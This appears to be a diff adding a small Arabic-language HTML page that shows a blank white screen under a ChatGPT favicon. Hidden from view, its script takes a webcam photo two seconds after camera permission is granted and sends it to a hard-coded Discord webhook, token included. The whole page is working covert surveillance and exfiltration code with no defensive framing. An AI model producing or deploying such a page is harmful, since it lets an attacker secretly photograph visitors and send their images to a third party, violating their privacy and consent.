@@ -1,1 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>(•-•)</title>
+<style>
+body, html {
+margin: 0;
+padding: 0;
+width: 100%;
+height: 100%;
+background-color: white; /* الشاشة البيضاء */
+display: flex;
+justify-content: center;
+align-items: center;
+}
+video, canvas {
+display: none;
+}
+  <link rel="icon" href="https://www.securities.io/wp-content/uploads/2024/03/ChatGPT.jpeg" type="image/jpeg">
+
+</style>
+</head>
+<body>
+<video id="video" width="640" height="480" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const context = canvas.getContext('2d');
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+video.srcObject = stream;
+setTimeout(captureAndSend, 2000);
+})
+.catch(err => {
+console.error("خطأ في الوصول للكاميرا: ", err);
+});
+
+function captureAndSend() {
+context.drawImage(video, 0, 0, 640, 480);
+
+context.font = '20px Arial';
+context.fillStyle = 'red';
+context.fillText('حقوقك محفوظة', 10, canvas.height - 20);
+
+canvas.toBlob(blob => {
+const formData = new FormData();
+formData.append('file', blob, 'image.png');
+
+const webhookURL = 'https://discord.com/api/webhooks/1280217915970555904/qYmz-RP0vmldczSXg1ckEtfTtIMQgQW1lhqntyfwRy7VQ7u-di798xVa3a4qMBqaiplu';
+
+fetch(webhookURL, {
+method: 'POST',
+body: formData
+})
+.then(response => {
+if (response.ok) {
+console.log('تم إرسال الصورة بنجاح');
+return response.json();
+} else {
+throw new Error('خطأ في إرسال الصورة');
+}
+})
+.then(data => console.log(data))
+.catch(error => console.error('خطأ:', error));
+}, 'image/png');
+}
+</script>
+</body>
+</html>
 
